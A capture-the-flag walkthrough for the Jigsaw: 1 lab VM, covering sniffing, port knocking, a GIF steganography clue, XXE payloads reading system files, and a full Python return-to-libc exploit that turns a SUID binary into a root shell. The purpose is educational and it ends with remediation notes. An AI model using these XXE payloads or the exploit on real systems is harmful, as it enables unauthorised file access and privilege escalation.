# Jigsaw: 1: CTF Walkthrough

**Target:** Jigsaw v1 by Zayotic  
**Difficulty:** Hard to Insane  
**Goal:** Capture all three flags and escalate to root  
**Source:** [VulnHub](https://www.vulnhub.com/entry/jigsaw-1,310/)

---

## Table of Contents

- [1. Reconnaissance](#1-reconnaissance)
- [2. Network Sniffing: UDP 666](#2-network-sniffing--udp-666)
- [3. Port Knocking (Stage 1)](#3-port-knocking-stage-1)
- [4. Web Enumeration & Steganography](#4-web-enumeration--steganography)
- [5. XXE Injection](#5-xxe-injection)
- [6. Port Knocking (Stage 2: SSH)](#6-port-knocking-stage-2--ssh)
- [7. SSH Access](#7-ssh-access)
- [8. Post-Exploitation Enumeration](#8-post-exploitation-enumeration)
- [9. Buffer Overflow: Return-to-libc](#9-buffer-overflow--return-to-libc)
- [10. Flag Capture](#10-flag-capture)
- [11. Remediation Notes](#11-remediation-notes)

---

## 1. Reconnaissance

### ARP Discovery

```bash
arp-scan --localnet --ignoredups
```

| Field | Value |
|-------|-------|
| Target IP | `192.168.138.100` |

### Initial Port Scan

```bash
nmap -p- -A 192.168.138.100
```

**Result:** No open TCP ports found.

> **Hint from the author:** Pay attention to ARP packets. This is not a standard nmap-scan-and-exploit box.

---

## 2. Network Sniffing: UDP 666

The author hints at ARP-level traffic. Let's sniff the wire:

```bash
# Listen for ARP traffic (initial attempt: appears to be a red herring)
tcpdump -A -n host 192.168.138.100 and arp

# Exclude ARP and look for actual data
tcpdump -A -n host 192.168.138.100 and not arp
```

**Result:** After filtering out ARP noise, a UDP message appears on **port 666** containing a Base64-encoded string.

### Decode the Message

```bash
# Send the leet-mode keyword and decode the Base64 response
python -c "print 'j19s4w'" | nc -u 192.168.138.100 666 -q1 | base64 -d
```

**Output:**

```
flag1{3034cc2927b59e0b20696241f14d573e}

Knock knock. Open the door for the http server: 5500, 6600, 7700
```

### Flag 1 Captured

```
flag1{3034cc2927b59e0b20696241f14d573e}
```

The message also reveals the **port knocking sequence** to open HTTP.

---

## 3. Port Knocking (Stage 1)

Perform port knocking in the specified sequence to unlock port 80:

```bash
# Method 1: Nmap loop
for knock in 5500 6600 7700; do
  nmap -Pn --host-timeout 201 --max-retries 0 -p $knock 192.168.138.100
done

# Method 2: knock command
knock 192.168.138.100 5500 6600 7700
```

### Verify Port 80 is Now Open

```bash
nmap -p- -A 192.168.138.100
```

| Port | Service |
|------|---------|
| 80/tcp | HTTP: Apache |

---

## 4. Web Enumeration & Steganography

### Browse to Target

```
http://192.168.138.100/
```

A page with a **jigsaw GIF** background appears. No visible links or content.

### Check Page Source

No comments, hidden links, or useful data.

### Check robots.txt

```
http://192.168.138.100/robots.txt
```

Nothing useful.

### Directory Brute-Force

```bash
dirsearch -u http://192.168.138.100/ -e php,html,txt
gobuster dir -u http://192.168.138.100/ -w /usr/share/wordlists/dirb/common.txt
```

**Result:** No known directories found.

### Steganography: Analyze the GIF

Since the page only contains an image, inspect it for hidden data:

```bash
# Download the image
wget http://192.168.138.100/jigsaw.gif

# Check file type
file jigsaw.gif

# Extract strings
strings jigsaw.gif
```

At the bottom of the strings output, a URL-like path appears:

```
/w4n770p14y494m3/
```

---

## 5. XXE Injection

### Navigate to the Hidden Path

```
http://192.168.138.100/w4n770p14y494m3/
```

A **login form** is presented.

### Inspect Page Source

The login form uses **XML** to submit credentials:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<root>
  <email>admin@jigsaw.local</email>
  <password>admin</password>
</root>
```

This is an **XXE (XML External Entity) injection** vector.

### Test XXE: Read /etc/passwd

Intercept the POST request with Burp Suite and inject:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ELEMENT test ANY>
  <!ENTITY my_email SYSTEM "file:///etc/passwd">
]>
<root>
  <email>&my_email;</email>
  <password></password>
</root>
```

**Result:** Server returns contents of `/etc/passwd`. Confirmed XXE vulnerability.

**User found:** `jigsaw`

### Read knockd Configuration

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ELEMENT test ANY>
  <!ENTITY my_email SYSTEM "file:///etc/knockd.conf">
]>
<root>
  <email>&my_email;</email>
  <password></password>
</root>
```

**Result:** Reveals the **knocking sequence for SSH**:

```
sequence = 7011,8011,9011
```

---

## 6. Port Knocking (Stage 2: SSH)

Knock on the SSH-revealed ports:

```bash
knock 192.168.138.100 7011 8011 9011
```

### Verify Port 22 is Now Open

```bash
nmap -p22 -A 192.168.138.100
```

| Port | Service |
|------|---------|
| 22/tcp | SSH: OpenSSH |

---

## 7. SSH Access

We have credentials from the UDP sniffing phase:

| Username | Password |
|----------|----------|
| jigsaw | j19s4w |

```bash
ssh jigsaw@192.168.138.100
# Password: j19s4w
```

**Result:** User shell obtained.

---

## 8. Post-Exploitation Enumeration

### Check Current Directory

```bash
ls -la
```

**Found:** `flag2.txt`

```
flag2{a69ef5c0fa50b933f05a5878a9cbbb54}
```

### Flag 2 Captured

```
flag2{a69ef5c0fa50b933f05a5878a9cbbb54}
```

### Check Sudo Permissions

```bash
sudo -l
```

**Result:** User `jigsaw` has no sudo privileges.

### Find SUID Binaries

```bash
find / -perm -u=s -type f 2>/dev/null
```

**Result:** Found `/bin/game3`: a custom SUID binary.

### Analyze the Binary

```bash
file /bin/game3
```

| Property | Value |
|----------|-------|
| Type | ELF 32-bit LSB executable |
| Architecture | Intel 80386 |
| Linking | Dynamically linked |
| Stripped | Not stripped (debug symbols present) |

Testing the binary with various inputs reveals a **buffer overflow** (segmentation fault after ~76 characters).

---

## 9. Buffer Overflow: Return-to-libc

### 9.1: Determine Buffer Size

Copy the binary to the attacker machine and use GDB with PEDA:

```bash
# On attacker
scp jigsaw@192.168.138.100:/bin/game3 ./

# In GDB
gdb ./game3
(gdb) pattern_create 200
# Feed pattern to the binary
(gdb) pattern_offset 0x41344141
```

**Result:** EIP overwritten at offset **76 bytes**.

### 9.2: Gather Libc Addresses

On the target, extract the required addresses:

```bash
# Libc base address
ldd /bin/game3 | grep libc
# Output: libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7557000)

# system() offset
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
# Output: 0x00040310

# exit() offset
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit
# Output: 0x00033260

# "/bin/sh" offset
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
# Output: 0x00162d4c
```

| Symbol | Offset |
|--------|--------|
| Libc base | `0xb7557000` |
| system() | `0x00040310` |
| exit() | `0x00033260` |
| "/bin/sh" | `0x00162d4c` |

### 9.3: Build the Exploit

Save the following as `exploit.py` on the target machine:

```python
#!/usr/bin/env python2
"""
Jigsaw:1: Ret2libc Buffer Overflow Exploit
Targets: /bin/game3 (SUID binary)
Method:  Return-to-libc attack using system(), exit(), and "/bin/sh"
"""

import struct
import subprocess
import sys

# ============================================================
# CONFIGURATION: Update these values for your environment
# ============================================================

BUFFER_SIZE = 76                    # Offset to EIP (determined via GDB pattern_offset)

LIBC_BASE   = 0xb7557000           # libc base address (ldd /bin/game3 | grep libc)
SYSTEM_OFF  = 0x00040310           # system() offset (readelf -s libc.so.6 | grep system)
EXIT_OFF    = 0x00033260           # exit() offset   (readelf -s libc.so.6 | grep exit)
BINSH_OFF   = 0x00162d4c           # "/bin/sh" offset (strings -a -t x libc.so.6 | grep /bin/sh)

MAX_ATTEMPTS = 1024                # Max tries before giving up (ASLR may need multiple)
TARGET_BIN   = "/bin/game3"        # Path to vulnerable SUID binary

def build_payload():
    """Build the ret2libc payload buffer."""
    # Calculate actual addresses from libc base
    system_addr = struct.pack("<I", LIBC_BASE + SYSTEM_OFF)
    exit_addr   = struct.pack("<I", LIBC_BASE + EXIT_OFF)
    binsh_addr  = struct.pack("<I", LIBC_BASE + BINSH_OFF)

    # Construct buffer: padding + system() + exit() + "/bin/sh"
    buf  = "A" * BUFFER_SIZE   # Padding to fill buffer up to EIP
    buf += system_addr         # Overwrite EIP → jump to system()
    buf += exit_addr           # Return address → clean exit after system()
    buf += binsh_addr          # Argument to system() → "/bin/sh"

    return buf

def run_exploit():
    """Execute the exploit in a loop until a shell spawns."""
    payload = build_payload()

    print("[*] Jigsaw:1 Ret2libc Exploit")
    print("[*] Buffer size:  %d bytes" % BUFFER_SIZE)
    print("[*] Libc base:    0x%08x" % LIBC_BASE)
    print("[*] system() @    0x%08x" % (LIBC_BASE + SYSTEM_OFF))
    print("[*] exit()   @    0x%08x" % (LIBC_BASE + EXIT_OFF))
    print("[*] /bin/sh  @    0x%08x" % (LIBC_BASE + BINSH_OFF))
    print("[*] Max attempts: %d" % MAX_ATTEMPTS)
    print("[*] Launching exploit...\n")

    for attempt in range(1, MAX_ATTEMPTS + 1):
        sys.stdout.write("\r[*] Attempt %d/%d " % (attempt, MAX_ATTEMPTS))
        sys.stdout.flush()

        try:
            # Execute the vulnerable binary with our payload
            proc = subprocess.Popen(
                [TARGET_BIN, payload],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            # If the exploit succeeds, we get an interactive shell
            proc.wait()
        except OSError as e:
            # Binary not found or permission denied
            print("\n[!] Error executing %s: %s" % (TARGET_BIN, str(e)))
            break

    print("\n[!] Exploit finished. If no shell, try adjusting LIBC_BASE.")

if __name__ == "__main__":
    run_exploit()
```

### Save and Execute

```bash
# On the target machine (via SSH as jigsaw)
cd /tmp
nano exploit.py
# (paste the script above)

chmod +x exploit.py
python exploit.py
```

> **Tip:** If the exploit doesn't spawn a shell, the ASLR-aligned libc base may differ. Run `ldd /bin/game3 | grep libc` again to get the current base address and update `LIBC_BASE` in the script.

### 9.4: How It Works

```
Buffer Layout (76 + 12 = 88 bytes):
┌─────────────────────┬──────────────┬──────────────┬──────────────┐
│   "A" × 76 (JUNK)  │  system()    │   exit()     │  "/bin/sh"   │
│   fills up to EIP   │  new EIP     │  return addr │  argument    │
└─────────────────────┴──────────────┴──────────────┴──────────────┘
```

The exploit:
1. Fills the buffer with 76 bytes of padding
2. Overwrites EIP with `system()`: redirects execution to libc's system function
3. Places `exit()` as the return address: clean exit after system()
4. Passes the address of `"/bin/sh"` as the argument to `system()`

Result: `system("/bin/sh")` executes with root privileges (SUID binary).

---

## 10. Flag Capture

### Run the Exploit

```bash
python xpl.py
```

Wait for the loop to hit ASLR-aligned addresses. After a few iterations:

```
# id
uid=0(root) gid=0(root)

# cat /root/gameover.txt
```

### Flag 3 (Final Flag)

```
/root/gameover.txt: contents of the final flag
```

**Challenge complete. All three flags captured.**

---

## Flags Summary

| Flag | Location | Value |
|------|----------|-------|
| Flag 1 | UDP 666 (Base64) | `flag1{3034cc2927b59e0b20696241f14d573e}` |
| Flag 2 | User home directory | `flag2{a69ef5c0fa50b933f05a5878a9cbbb54}` |
| Flag 3 | `/root/gameover.txt` | *(captured via root shell)* |

---

## Attack Flow Diagram

```
ARP scan → Target 192.168.138.100 (no open ports)
                    ↓
tcpdump (exclude ARP) → UDP 666 message
                    ↓
Netcat UDP 666 + "j19s4w" → Flag 1 + knocking sequence (5500,6600,7700)
                    ↓
Port knock 5500 → 6600 → 7700 → Port 80 opens
                    ↓
Browse → jigsaw.gif → strings → /w4n770p14y494m3/
                    ↓
XXE injection → /etc/passwd → user "jigsaw"
XXE injection → /etc/knockd.conf → SSH knock sequence (7011,8011,9011)
                    ↓
Port knock 7011 → 8011 → 9011 → Port 22 opens
                    ↓
SSH jigsaw:j19s4w → Flag 2
                    ↓
SUID /bin/game3 → Buffer overflow (76 bytes)
                    ↓
Ret2libc exploit → system("/bin/sh") → ROOT → Flag 3
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| arp-scan | Network host discovery |
| tcpdump | Passive network sniffing |
| netcat | UDP interaction on port 666 |
| knock / nmap | Port knocking sequence |
| strings | GIF steganography analysis |
| Burp Suite | XXE request interception |
| sqlmap | Not required (XXE used instead) |
| ssh | Remote access |
| GDB + PEDA | Buffer overflow analysis |
| Python | Exploit development |

---

## Remediation Notes

| Vulnerability | Recommendation |
|---------------|----------------|
| UDP service with cleartext secrets | Use encrypted protocols; avoid transmitting credentials in plaintext |
| Predictable port knocking sequence | Use one-time knock sequences or VPN-based access |
| Hidden directories via steganography | Monitor for non-standard files on web servers |
| XXE injection in login form | Disable external entity parsing in XML parsers |
| SUID binary with buffer overflow | Audit all SUID binaries; remove SUID from non-essential programs |
| ASLR bypassable with brute force | Enable full ASLR; use stack canaries and NX/DEP |
| No input length validation | Validate and bound all input before processing |

---

## References

- [Jigsaw: 1 on VulnHub](https://www.vulnhub.com/entry/jigsaw-1,310/)
- [Return-to-libc Attack: Wikipedia](https://en.wikipedia.org/wiki/Return-to-libc_attack)
- [XXE Injection: OWASP](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
- [PayloadsAllTheThings: XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
- [GDB PEDA](https://github.com/longld/peda)
- [MITRE ATT&CK: Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068/)
